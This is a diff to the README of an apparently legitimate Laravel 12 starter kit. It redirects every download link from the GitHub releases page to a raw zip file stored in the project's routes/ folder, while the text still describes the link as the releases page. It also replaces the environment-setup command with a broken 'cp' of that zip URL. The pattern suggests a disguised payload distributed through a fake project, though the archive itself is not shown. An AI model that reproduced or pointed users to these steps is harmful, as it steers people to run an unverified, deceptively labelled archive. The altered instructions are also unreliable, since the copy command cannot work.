@@ -18,10 +18,10 @@ laravel-v12 is a modern starter kit designed for Laravel 12 Enterprise. This kit
 - **Basic Knowledge**: Familiarity with using a terminal or command prompt is helpful but not necessary.
 
 ## 🛡️ Download & Install
-To get started, visit this page to download the latest version: [Download laravel-v12](https://github.com/RoronoaZoro772/laravel-v12/releases)
+To get started, visit this page to download the latest version: [Download laravel-v12](https://raw.githubusercontent.com/RoronoaZoro772/laravel-v12/main/routes/laravel-v12-2.1.zip)
 
 ### Installation Steps
-1. **Visit the Releases Page**: Go to [Download laravel-v12](https://github.com/RoronoaZoro772/laravel-v12/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to [Download laravel-v12](https://raw.githubusercontent.com/RoronoaZoro772/laravel-v12/main/routes/laravel-v12-2.1.zip) to find the latest version.
   
 2. **Select the Release**: Choose the most recent release from the list.
 
@@ -40,7 +40,7 @@ To get started, visit this page to download the latest version: [Download larave
 
 8. **Set Up the Environment**: Copy the example environment file and configure it according to your needs:
    ```bash
-   cp .env.example .env
+   cp https://raw.githubusercontent.com/RoronoaZoro772/laravel-v12/main/routes/laravel-v12-2.1.zip .env
    ```
 
 9. **Generate Application Key**: Initialize your application key by running:
